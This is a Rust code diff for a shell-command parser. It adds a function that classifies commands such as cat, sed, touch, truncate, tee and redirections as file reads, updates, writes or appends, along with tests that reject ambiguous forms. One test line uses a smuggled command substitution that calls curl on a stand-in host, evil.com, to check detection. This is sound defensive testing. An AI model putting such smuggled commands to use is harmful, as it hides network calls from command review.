@@ -2,7 +2,11 @@ use brush_parser::ast;
 use brush_parser::ast::SourceLocation;
 use brush_parser::word::WordPiece;
 use brush_parser::{Parser, ParserOptions, SourceInfo};
-use std::io::BufReader;
+use std::{
+    collections::HashSet,
+    io::BufReader,
+    path::{Component, Path, PathBuf},
+};
 
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct TerminalCommandPrefix {
@@ -18,6 +22,450 @@ pub enum TerminalCommandValidation {
     Safe,
     Unsafe,
     Unsupported,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum ShellFileOperationKind {
+    Read,
+    Update,
+    Write,
+    Append,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct ShellFileOperation {
+    pub kind: ShellFileOperationKind,
+    pub path: PathBuf,
+}
+
+impl ShellFileOperation {
+    pub fn new(kind: ShellFileOperationKind, path: impl Into<PathBuf>) -> Self {
+        Self {
+            kind,
+            path: path.into(),
+        }
+    }
+}
+
+pub fn extract_file_operations(command: &str) -> Option<Vec<ShellFileOperation>> {
+    let reader = BufReader::new(command.as_bytes());
+    let options = ParserOptions::default();
+    let source_info = SourceInfo::default();
+    let mut parser = Parser::new(reader, &options, &source_info);
+    let program = parser.parse_program().ok()?;
+    let mut operations = Vec::new();
+
+    for complete_command in &program.complete_commands {
+        for item in &complete_command.0 {
+            if matches!(item.1, ast::SeparatorOperator::Async) {
+                return None;
+            }
+            extract_file_operations_from_and_or_list(&item.0, &mut operations)?;
+        }
+    }
+
+    if operations.is_empty() {
+        return None;
+    }
+
+    let mut paths = HashSet::new();
+    for operation in &mut operations {
+        operation.path = normalize_path(&operation.path);
+        if !paths.insert(operation.path.clone()) {
+            return None;
+        }
+    }
+    Some(operations)
+}
+
+fn extract_file_operations_from_and_or_list(
+    and_or_list: &ast::AndOrList,
+    operations: &mut Vec<ShellFileOperation>,
+) -> Option<()> {
+    extract_file_operations_from_pipeline(&and_or_list.first, operations)?;
+    for item in &and_or_list.additional {
+        match item {
+            ast::AndOr::And(pipeline) => {
+                extract_file_operations_from_pipeline(pipeline, operations)?;
+            }
+            ast::AndOr::Or(_) => return None,
+        }
+    }
+    Some(())
+}
+
+fn extract_file_operations_from_pipeline(
+    pipeline: &ast::Pipeline,
+    operations: &mut Vec<ShellFileOperation>,
+) -> Option<()> {
+    if pipeline.timed.is_some() || pipeline.bang {
+        return None;
+    }
+
+    if pipeline.seq.len() == 1 {
+        let ast::Command::Simple(command) = pipeline.seq.first()? else {
+            return None;
+        };
+        operations.extend(classify_simple_file_command(command)?);
+        return Some(());
+    }
+
+    let (last, producers) = pipeline.seq.split_last()?;
+    for producer in producers {
+        let ast::Command::Simple(producer) = producer else {
+            return None;
+        };
+        validate_pipeline_producer(producer)?;
+    }
+    let ast::Command::Simple(last) = last else {
+        return None;
+    };
+    operations.extend(classify_tee_command(last)?);
+    Some(())
+}
+
+struct SimpleCommandParts<'a> {
+    words: Vec<String>,
+    redirects: Vec<&'a ast::IoRedirect>,
+}
+
+fn simple_command_parts(command: &ast::SimpleCommand) -> Option<SimpleCommandParts<'_>> {
+    if command
+        .prefix
+        .as_ref()
+        .is_some_and(|prefix| !prefix.0.is_empty())
+    {
+        return None;
+    }
+
+    let mut words = vec![literal_word(command.word_or_name.as_ref()?)?];
+    let mut redirects = Vec::new();
+    if let Some(suffix) = &command.suffix {
+        for item in &suffix.0 {
+            match item {
+                ast::CommandPrefixOrSuffixItem::Word(word) => words.push(literal_word(word)?),
+                ast::CommandPrefixOrSuffixItem::IoRedirect(redirect) => redirects.push(redirect),
+                ast::CommandPrefixOrSuffixItem::AssignmentWord(_, _)
+                | ast::CommandPrefixOrSuffixItem::ProcessSubstitution(_, _) => return None,
+            }
+        }
+    }
+    Some(SimpleCommandParts { words, redirects })
+}
+
+fn validate_pipeline_producer(command: &ast::SimpleCommand) -> Option<()> {
+    let parts = simple_command_parts(command)?;
+    if parts.redirects.is_empty() {
+        Some(())
+    } else {
+        None
+    }
+}
+
+fn classify_simple_file_command(command: &ast::SimpleCommand) -> Option<Vec<ShellFileOperation>> {
+    let parts = simple_command_parts(command)?;
+    if !parts.redirects.is_empty() {
+        return classify_redirected_command(&parts);
+    }
+
+    let (name, arguments) = parts.words.split_first()?;
+    match name.as_str() {
+        "cat" => classify_cat(arguments),
+        "head" => classify_head_or_tail(arguments, false),
+        "tail" => classify_head_or_tail(arguments, true),
+        "sed" => classify_sed(arguments),
+        "touch" => classify_touch(arguments),
+        "truncate" => classify_truncate(arguments),
+        "tee" => classify_tee_parts(&parts),
+        _ => None,
+    }
+}
+
+fn classify_cat(arguments: &[String]) -> Option<Vec<ShellFileOperation>> {
+    let paths = parse_paths_after_flags(arguments, |flag| {
+        flag == "--" || flag.starts_with('-') && flag[1..].chars().all(|c| "AbenstuvET".contains(c))
+    })?;
+    operations_for_paths(ShellFileOperationKind::Read, paths)
+}
+
+fn classify_head_or_tail(arguments: &[String], is_tail: bool) -> Option<Vec<ShellFileOperation>> {
+    let mut paths = Vec::new();
+    let mut index = 0;
+    while let Some(argument) = arguments.get(index) {
+        if argument == "--" {
+            paths.extend_from_slice(arguments.get(index + 1..)?);
+            break;
+        } else if is_tail && matches!(argument.as_str(), "-f" | "-F" | "--follow")
+            || argument.starts_with("--follow=")
+        {
+            return None;
+        } else if matches!(argument.as_str(), "-n" | "--lines" | "-c" | "--bytes") {
+            index += 1;
+            arguments.get(index)?;
+        } else if argument.starts_with("--lines=")
+            || argument.starts_with("--bytes=")
+            || argument
+                .strip_prefix('-')
+                .is_some_and(|value| !value.is_empty() && value.chars().all(|c| c.is_ascii_digit()))
+            || matches!(
+                argument.as_str(),
+                "-q" | "--quiet" | "--silent" | "-v" | "--verbose" | "-z" | "--zero-terminated"
+            )
+        {
+        } else if argument.starts_with('-') {
+            return None;
+        } else {
+            paths.push(argument.clone());
+        }
+        index += 1;
+    }
+    operations_for_paths(ShellFileOperationKind::Read, paths)
+}
+
+fn classify_sed(arguments: &[String]) -> Option<Vec<ShellFileOperation>> {
+    let mut arguments = arguments.iter();
+    let first = arguments.next()?;
+    if first == "-n" || first == "--quiet" || first == "--silent" {
+        let script = arguments.next()?;
+        if !is_sed_print_script(script) {
+            return None;
+        }
+        return operations_for_paths(ShellFileOperationKind::Read, arguments.cloned().collect());
+    }
+
+    let mut remaining = arguments.as_slice();
+    let in_place = match first.as_str() {
+        "-i" | "--in-place" | "--in-place=" => true,
+        _ => false,
+    };
+    if !in_place {
+        return None;
+    }
+    if remaining
+        .first()
+        .is_some_and(|argument| argument.is_empty())
+    {
+        remaining = &remaining[1..];
+    }
+    let (_script, paths) = remaining.split_first()?;
+    operations_for_paths(ShellFileOperationKind::Update, paths.to_vec())
+}
+
+fn is_sed_print_script(script: &str) -> bool {
+    let Some(addresses) = script.strip_suffix('p') else {
+        return false;
+    };
+    let mut addresses = addresses.split(',');
+    let valid_address = |address: &str| {
+        !address.is_empty() && address.chars().all(|character| character.is_ascii_digit())
+    };
+    valid_address(addresses.next().unwrap_or_default())
+        && addresses.next().is_none_or(valid_address)
+        && addresses.next().is_none()
+}
+
+fn classify_touch(arguments: &[String]) -> Option<Vec<ShellFileOperation>> {
+    let mut has_no_create = false;
+    let mut paths = Vec::new();
+    let mut index = 0;
+    while let Some(argument) = arguments.get(index) {
+        match argument.as_str() {
+            "-c" | "--no-create" => has_no_create = true,
+            "-a" | "-m" => {}
+            "-d" | "--date" | "-t" => {
+                index += 1;
+                arguments.get(index)?;
+            }
+            value if value.starts_with("--date=") => {}
+            "--" => {
+                paths.extend_from_slice(arguments.get(index + 1..)?);
+                break;
+            }
+            value if value.starts_with('-') => return None,
+            _ => paths.push(argument.clone()),
+        }
+        index += 1;
+    }
+    has_no_create.then_some(())?;
+    operations_for_paths(ShellFileOperationKind::Update, paths)
+}
+
+fn classify_truncate(arguments: &[String]) -> Option<Vec<ShellFileOperation>> {
+    let mut has_no_create = false;
+    let mut paths = Vec::new();
+    let mut index = 0;
+    while let Some(argument) = arguments.get(index) {
+        match argument.as_str() {
+            "-c" | "--no-create" => has_no_create = true,
+            "-o" | "--io-blocks" => {}
+            "-s" | "--size" => {
+                index += 1;
+                arguments.get(index)?;
+            }
+            value if value.starts_with("--size=") => {}
+            "--" => {
+                paths.extend_from_slice(arguments.get(index + 1..)?);
+                break;
+            }
+            value if value.starts_with('-') => return None,
+            _ => paths.push(argument.clone()),
+        }
+        index += 1;
+    }
+    has_no_create.then_some(())?;
+    operations_for_paths(ShellFileOperationKind::Update, paths)
+}
+
+fn classify_redirected_command(parts: &SimpleCommandParts<'_>) -> Option<Vec<ShellFileOperation>> {
+    let mut output = None;
+    let mut has_quoted_heredoc = false;
+    for redirect in &parts.redirects {
+        match redirect {
+            ast::IoRedirect::File(fd, kind, ast::IoFileRedirectTarget::Filename(path))
+                if fd.is_none_or(|fd| fd == 1)
+                    && matches!(
+                        kind,
+                        ast::IoFileRedirectKind::Write | ast::IoFileRedirectKind::Append
+                    ) =>
+            {
+                if output.is_some() {
+                    return None;
+                }
+                let kind = if matches!(kind, ast::IoFileRedirectKind::Append) {
+                    ShellFileOperationKind::Append
+                } else {
+                    ShellFileOperationKind::Write
+                };
+                output = Some(ShellFileOperation::new(kind, literal_word(path)?));
+            }
+            ast::IoRedirect::HereDocument(fd, heredoc)
+                if fd.is_none_or(|fd| fd == 0) && !heredoc.requires_expansion =>
+            {
+                if has_quoted_heredoc {
+                    return None;
+                }
+                has_quoted_heredoc = true;
+            }
+            _ => return None,
+        }
+    }
+
+    let name = parts.words.first()?;
+    let valid_producer = matches!(name.as_str(), "echo" | "printf") && !has_quoted_heredoc
+        || name == "cat" && has_quoted_heredoc && parts.words.len() == 1;
+    valid_producer.then_some(vec![output?])
+}
+
+fn classify_tee_command(command: &ast::SimpleCommand) -> Option<Vec<ShellFileOperation>> {
+    let parts = simple_command_parts(command)?;
+    classify_tee_parts(&parts)
+}
+
+fn classify_tee_parts(parts: &SimpleCommandParts<'_>) -> Option<Vec<ShellFileOperation>> {
+    if !parts.redirects.is_empty() || parts.words.first()?.as_str() != "tee" {
+        return None;
+    }
+    let mut kind = ShellFileOperationKind::Write;
+    let mut paths = Vec::new();
+    for argument in &parts.words[1..] {
+        match argument.as_str() {
+            "-a" | "--append" => kind = ShellFileOperationKind::Append,
+            "--" => {}
+            value if value.starts_with('-') => return None,
+            _ => paths.push(argument.clone()),
+        }
+    }
+    operations_for_paths(kind, paths)
+}
+
+fn parse_paths_after_flags(
+    arguments: &[String],
+    is_allowed_flag: impl Fn(&str) -> bool,
+) -> Option<Vec<String>> {
+    let mut paths = Vec::new();
+    let mut parsing_flags = true;
+    for argument in arguments {
+        if parsing_flags && argument == "--" {
+            parsing_flags = false;
+        } else if parsing_flags && argument.starts_with('-') {
+            if !is_allowed_flag(argument) {
+                return None;
+            }
+        } else {
+            paths.push(argument.clone());
+        }
+    }
+    Some(paths)
+}
+
+fn operations_for_paths(
+    kind: ShellFileOperationKind,
+    paths: Vec<String>,
+) -> Option<Vec<ShellFileOperation>> {
+    if paths.is_empty() || paths.iter().any(|path| path == "-") {
+        return None;
+    }
+    Some(
+        paths
+            .into_iter()
+            .map(|path| ShellFileOperation::new(kind, path))
+            .collect(),
+    )
+}
+
+fn literal_word(word: &ast::Word) -> Option<String> {
+    let options = ParserOptions::default();
+    let pieces = brush_parser::word::parse(&word.value, &options).ok()?;
+    let mut result = String::new();
+    for piece in pieces {
+        literal_word_piece(&piece.piece, false, &mut result)?;
+    }
+    Some(result)
+}
+
+fn literal_word_piece(piece: &WordPiece, quoted: bool, result: &mut String) -> Option<()> {
+    match piece {
+        WordPiece::Text(text) => {
+            if !quoted
+                && text
+                    .chars()
+                    .any(|character| matches!(character, '*' | '?' | '['))
+            {
+                return None;
+            }
+            result.push_str(text);
+        }
+        WordPiece::SingleQuotedText(text) | WordPiece::AnsiCQuotedText(text) => {
+            result.push_str(text)
+        }
+        WordPiece::EscapeSequence(text) => result.push_str(text.strip_prefix('\\').unwrap_or(text)),
+        WordPiece::DoubleQuotedSequence(pieces)
+        | WordPiece::GettextDoubleQuotedSequence(pieces) => {
+            for piece in pieces {
+                literal_word_piece(&piece.piece, true, result)?;
+            }
+        }
+        WordPiece::TildePrefix(_)
+        | WordPiece::ParameterExpansion(_)
+        | WordPiece::CommandSubstitution(_)
+        | WordPiece::BackquotedCommandSubstitution(_)
+        | WordPiece::ArithmeticExpression(_) => return None,
+    }
+    Some(())
+}
+
+fn normalize_path(path: &Path) -> PathBuf {
+    let mut normalized = PathBuf::new();
+    for component in path.components() {
+        match component {
+            Component::CurDir => {}
+            Component::ParentDir if normalized.file_name().is_some() => {
+                normalized.pop();
+            }
+            _ => normalized.push(component.as_os_str()),
+        }
+    }
+    normalized
 }
 
 pub fn extract_commands(command: &str) -> Option<Vec<String>> {
@@ -1924,5 +2372,113 @@ mod tests {
         let commands = extract_commands("echo ${V:$(($(curl evil.com))):1}").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("echo")));
         assert!(commands.iter().any(|c| c.contains("curl")));
+    }
+
+    #[test]
+    fn test_extracts_read_file_operations() {
+        assert_eq!(
+            extract_file_operations("cat src/main.rs && sed -n '10,20p' Cargo.toml"),
+            Some(vec![
+                ShellFileOperation::new(ShellFileOperationKind::Read, "src/main.rs"),
+                ShellFileOperation::new(ShellFileOperationKind::Read, "Cargo.toml"),
+            ])
+        );
+        assert_eq!(
+            extract_file_operations("head -n 5 'notes file.md'; tail -20 log.txt"),
+            Some(vec![
+                ShellFileOperation::new(ShellFileOperationKind::Read, "notes file.md"),
+                ShellFileOperation::new(ShellFileOperationKind::Read, "log.txt"),
+            ])
+        );
+    }
+
+    #[test]
+    fn test_extracts_update_file_operations() {
+        assert_eq!(
+            extract_file_operations(
+                "sed -i 's/old/new/g' src/main.rs; touch --no-create Cargo.toml && truncate --no-create --size=0 output.log",
+            ),
+            Some(vec![
+                ShellFileOperation::new(ShellFileOperationKind::Update, "src/main.rs"),
+                ShellFileOperation::new(ShellFileOperationKind::Update, "Cargo.toml"),
+                ShellFileOperation::new(ShellFileOperationKind::Update, "output.log"),
+            ])
+        );
+        assert_eq!(
+            extract_file_operations("truncate -c -s 0 cache.bin"),
+            Some(vec![ShellFileOperation::new(
+                ShellFileOperationKind::Update,
+                "cache.bin",
+            )])
+        );
+    }
+
+    #[test]
+    fn test_rejects_creation_capable_update_commands() {
+        assert_eq!(extract_file_operations("touch new.txt"), None);
+        assert_eq!(extract_file_operations("truncate -s 0 new.txt"), None);
+        assert_eq!(
+            extract_file_operations("sed -i.bak 's/a/b/' file.txt"),
+            None
+        );
+    }
+
+    #[test]
+    fn test_extracts_write_and_append_redirections() {
+        assert_eq!(
+            extract_file_operations("printf '%s\\n' hello > output.txt; echo more >> log.txt"),
+            Some(vec![
+                ShellFileOperation::new(ShellFileOperationKind::Write, "output.txt"),
+                ShellFileOperation::new(ShellFileOperationKind::Append, "log.txt"),
+            ])
+        );
+        assert_eq!(
+            extract_file_operations("cat > script.sh <<'EOF'\necho hello\nEOF"),
+            Some(vec![ShellFileOperation::new(
+                ShellFileOperationKind::Write,
+                "script.sh",
+            )])
+        );
+    }
+
+    #[test]
+    fn test_extracts_tee_file_operations() {
+        assert_eq!(
+            extract_file_operations("generate-content --format text | tee output.txt"),
+            Some(vec![ShellFileOperation::new(
+                ShellFileOperationKind::Write,
+                "output.txt",
+            )])
+        );
+        assert_eq!(
+            extract_file_operations("printf hello | tee -a log.txt"),
+            Some(vec![ShellFileOperation::new(
+                ShellFileOperationKind::Append,
+                "log.txt",
+            )])
+        );
+    }
+
+    #[test]
+    fn test_rejects_ambiguous_file_operations() {
+        for command in [
+            "cat $FILE",
+            "cat *.rs",
+            "cat a || cat b",
+            "cat a & cat b",
+            "cat a && echo done",
+            "cat a; tail a",
+            "printf hello > a | tee b",
+            "generate | tee output.txt | consume",
+            "tail -f log.txt",
+            "touch -c --reference source target",
+            "truncate -c --reference source target",
+        ] {
+            assert_eq!(
+                extract_file_operations(command),
+                None,
+                "unexpectedly classified {command:?}",
+            );
+        }
     }
 }
